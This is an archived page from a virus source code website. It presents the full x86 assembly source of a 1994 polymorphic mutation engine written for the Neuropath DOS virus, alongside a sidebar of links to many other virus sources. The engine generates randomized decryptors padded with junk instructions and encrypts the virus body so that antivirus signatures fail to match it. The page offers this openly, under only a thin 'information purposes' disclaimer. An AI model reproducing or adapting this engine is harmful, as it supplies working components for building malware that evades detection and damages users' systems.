<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: neuroeng_asm</title>
<meta name="KEYWORDS" content="neuroeng.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for neuroeng.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="naktruth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/naktruth_asm.php">naktruth_asm</a><br>
<a href="narcosis_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/narcosis_asm.php">narcosis_asm</a><br>
<a href="natas_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/natas_asm.php">natas_asm</a><br>
<a href="nav_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nav_asm.php">nav_asm</a><br>
<a href="navigatr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/navigatr_asm.php">navigatr_asm</a><br>
<a href="navigtor_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/navigtor_asm.php">navigtor_asm</a><br>
<a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/n/naziph2b_pas.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/n/naziph2b_pas.php'" tppabs="http://www.totallygeek.com/vscdb/n/naziph2b_pas.php">naziph2b_pas</a><br>
<a href="naziph2_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/naziph2_pas.php">naziph2_pas</a><br>
<a href="naziphob_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/naziphob_pas.php">naziphob_pas</a><br>
<a href="nd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nd_asm.php">nd_asm</a><br>
<a href="necro_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/necro_asm.php">necro_asm</a><br>
<a href="ned09__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/ned09__asm.php">ned09__asm</a><br>
<a href="ned09_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/ned09_asm.php">ned09_asm</a><br>
<a href="ned_demo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/ned_demo_asm.php">ned_demo_asm</a><br>
<a href="neuro_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/neuro_asm.php">neuro_asm</a><br>
<a href="neuroeng_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/neuroeng_asm.php">neuroeng_asm</a><br>
<a href="neverend_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/neverend_asm.php">neverend_asm</a><br>
<a href="neverone_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/neverone_asm.php">neverone_asm</a><br>
<a href="newc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/newc_asm.php">newc_asm</a><br>
<a href="newtroi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/newtroi_asm.php">newtroi_asm</a><br>
<a href="newvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/newvir_asm.php">newvir_asm</a><br>
<a href="newzland_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/newzland_asm.php">newzland_asm</a><br>
<a href="newzlnd2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/newzlnd2_asm.php">newzlnd2_asm</a><br>
<a href="newzlndb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/newzlndb_asm.php">newzlndb_asm</a><br>
<a href="nhackerf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nhackerf_asm.php">nhackerf_asm</a><br>
<a href="nibbles_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nibbles_asm.php">nibbles_asm</a><br>
<a href="nina___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nina___asm.php">nina___asm</a><br>
<a href="nina__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nina__asm.php">nina__asm</a><br>
<a href="nina_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nina_asm.php">nina_asm</a><br>
<a href="nina-d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nina-d_asm.php">nina-d_asm</a><br>
<a href="ninja_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/ninja_1_asm.php">ninja_1_asm</a><br>
<a href="ninja-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/ninja-1_asm.php">ninja-1_asm</a><br>
<a href="ninja1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/ninja1_asm.php">ninja1_asm</a><br>
<a href="nkpox11_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nkpox11_asm.php">nkpox11_asm</a><br>
<a href="no_1_a_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/no_1_a_pas.php">no_1_a_pas</a><br>
<a href="no_1_b_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/no_1_b_pas.php">no_1_b_pas</a><br>
<a href="nobeaste_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nobeaste_asm.php">nobeaste_asm</a><br>
<a href="nobeastf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nobeastf_asm.php">nobeastf_asm</a><br>
<a href="noint_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/noint_asm.php">noint_asm</a><br>
<a href="nomem_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nomem_asm.php">nomem_asm</a><br>
<a href="nomncltr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nomncltr_asm.php">nomncltr_asm</a><br>
<a href="nont-512_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nont-512_asm.php">nont-512_asm</a><br>
<a href="not_casc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/not_casc_asm.php">not_casc_asm</a><br>
<a href="notimp_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/notimp_asm.php">notimp_asm</a><br>
<a href="npox10_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox10_asm.php">npox10_asm</a><br>
<a href="npox11_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox11_asm.php">npox11_asm</a><br>
<a href="npox_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox_1_asm.php">npox_1_asm</a><br>
<a href="npox-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox-1_asm.php">npox-1_asm</a><br>
<a href="npox21_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox21_asm.php">npox21_asm</a><br>
<a href="npox_v10_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox_v10_asm.php">npox_v10_asm</a><br>
<a href="npox-v10_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox-v10_asm.php">npox-v10_asm</a><br>
<a href="npox_v11_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox_v11_asm.php">npox_v11_asm</a><br>
<a href="npox-v11_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox-v11_asm.php">npox-v11_asm</a><br>
<a href="npox-v20_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox-v20_asm.php">npox-v20_asm</a><br>
<a href="npox-v21_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/npox-v21_asm.php">npox-v21_asm</a><br>
<a href="nrlg_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nrlg_asm.php">nrlg_asm</a><br>
<a href="nrlgsant_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nrlgsant_asm.php">nrlgsant_asm</a><br>
<a href="nukex_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nukex_asm.php">nukex_asm</a><br>
<a href="number1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number1_asm.php">number1_asm</a><br>
<a href="number1b_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number1b_pas.php">number1b_pas</a><br>
<a href="number_1_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number_1_pas.php">number_1_pas</a><br>
<a href="number1_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number1_pas.php">number1_pas</a><br>
<a href="number_6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number_6_asm.php">number_6_asm</a><br>
<a href="number-6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number-6_asm.php">number-6_asm</a><br>
<a href="number6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/number6_asm.php">number6_asm</a><br>
<a href="nymphmit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nymphmit_asm.php">nymphmit_asm</a><br>
<a href="nzeland2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nzeland2_asm.php">nzeland2_asm</a><br>
<a href="nzeland_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/nzeland_asm.php">nzeland_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

; Neurotic Mutation Engine v1.00 for Neuropath
; by MnemoniX 1994

engine          proc    near
                call    randomize

get_reg_1:
                mov     ax,7                    ; counter register
                call    _random
                inc     ax
                cmp     al,4
                je      get_reg_1
                cmp     al,5
                ja      get_reg_1
                mov     ds:reg_1,al

                push    di                      ; save this

                push    ax
                call    garbage_dump            ; crap
                pop     ax

                add     al,0B8h                 ; store MOV instruction
                stosb
                mov     ax,cx
                stosw

                call    garbage_dump            ; more crap

                mov     al,0BFh
                stosb
                push    di                      ; use this later
                stosw

                call    garbage_dump            ; even more crap

                mov     ax,0F78Bh
                stosw

                push    di                      ; use this later too
                call    garbage_dump            ; more crap

                mov     al,0ADh                 ; a LODSW
                stosb

                call    garbage_dump            ; yet more crap

                mov     al,2
                call    _random
                test    al,al
                je      add_it

                mov     al,35h
                mov     bl,al
                je      decryptor
add_it:
                mov     al,5
                mov     bl,2Dh
decryptor:
                stosb
                mov     ds:encrypt_act,bl       ; for encryption

                mov     ax,-1
                call    _random
                stosw
                mov     ds:encrypt_key,ax       ; for encryption
                
                call    garbage_dump            ; just pilin' on the crap

                mov     al,0ABh                 ; a STOSW
                stosb

                call    garbage_dump            ; the crap continues ...

                mov     al,ds:reg_1             ; decrement counter
                add     al,48h
                mov     ah,9Ch                  ; and a PUSHF
                stosw

                call    garbage_dump            ; C-R-A-P ...

                mov     ax,749Dh                ; a POPF and JZ
                stosw
                mov     ax,4
                call    _random                 ; use later
                mov     bx,ax
                add     al,3
                stosb

                mov     al,0E9h                 ; a JMP
                stosb
                pop     ax                      ; use LODSW offset
                sub     ax,di
                dec     ax
                dec     ax
                stosw

                add     di,bx                   ; fix up DI

                pop     bx                      ; now fix up offset value
                pop     bp
                sub     bp,di
                neg     bp
                push    bp                      ; size of decryptor - for l8r
                add     bp,dx
                mov     es:[bx],bp

                push    cx

                push    si
                mov     si,offset one_byters    ; swap one-byte instructions
                mov     ax,7                    ; around for variety
                call    _random
                mov     bx,ax
                mov     al,7
                call    _random
                mov     ah,[bx+si]
                mov     bl,al
                mov     [bx+si],ah
                pop     si

; now we encrypt
encrypt_it:
                lodsw
encrypt_act     db      0
encrypt_key     dw      0
                stosw
                loop    encrypt_it

                pop     cx
                pop     dx
                add     cx,dx
                ret

reg_1           db      0

rnd_seed_1      dw      0
rnd_seed_2      dw      0


garbage_dump:
                mov     ax,7                    ; garbage instructions
                call    _random
                add     ax,5
                push    cx
                mov     cx,ax
dump_it:
; El Basurero - "The GarbageMan"
                mov     ax,8
                call    _random
                cmp     al,2
                jb      next_one
                je      garbage_1       ; a MOV ??,AX
                cmp     al,3
                je      garbage_2       ; operate ??,AX
                cmp     al,4
                je      garbage_3       ; CMP or TEST AX/AL,??
                cmp     al,5            ; a few little instructions
                jae     garbage_4
next_one:
                loop    dump_it
                pop     cx
                ret

garbage_1:
                mov     al,8Bh
                stosb  
                call    get_mov_reg
                shl     ax,1
                shl     ax,1
                shl     ax,1
                add     al,0C0h
                stosb
                jmp     next_one

garbage_2:
                mov     al,8
                call    _random
                shl     ax,1
                shl     ax,1
                shl     ax,1
                add     al,3
                stosb
                call    get_mov_reg
                shl     ax,1
                shl     ax,1
                shl     ax,1
                add     al,0C0h
                stosb
                jmp     next_one

garbage_3:
                mov     al,2
                call    _random
                test    al,al
                je      a_cmp
                mov     al,0A9h
                jmp     storage
a_cmp:
                mov     al,3Dh
storage:
                stosb
                mov     ax,-1
                call    _random
                stosw
                jmp     next_one

garbage_4:
                push    cx
                mov     ax,4
                call    _random
                add     ax,3
                mov     cx,ax
                push    si
                mov     bx,offset one_byters
filler_loop:
                mov     ax,8
                call    _random
                cmp     al,7
                je      make_inc_dec
                mov     si,ax
                mov     al,[bx+si]
proceed:
                stosb
                loop    filler_loop

                pop     si cx
                jmp     next_one

make_inc_dec:
                call    get_mov_reg
                add     al,40h
                jmp     proceed

get_mov_reg:
                mov     ax,8
                call    _random
                test    al,al
                je      get_mov_reg
                cmp     al,4
                je      get_mov_reg
                cmp     al,5
                ja      get_mov_reg
                cmp     al,reg_1
                je      get_mov_reg
                ret

one_byters:
                db      0CCh
                stc
                clc
                cmc
                sti
                nop
                cld

randomize:
                push    cx dx
                xor     ah,ah
                int     1Ah
                mov     rnd_seed_1,dx
                add     dx,cx
                mov     rnd_seed_2,dx
                pop     dx cx
                ret

_random:
                push    cx dx ax
                add     dx,rnd_seed_2
                add     dx,17
                mov     ax,dx
                xor     dx,dx
                test    ax,ax
                je      rnd_done
                pop     cx
                div     cx
                mov     ax,dx                   ; AX now holds our random #
rnd_done:
                mov     dx,rnd_seed_1
                add     rnd_seed_2,dx
                pop     dx cx
                ret

engine          endp

</textarea></td></tr></table></body></html>
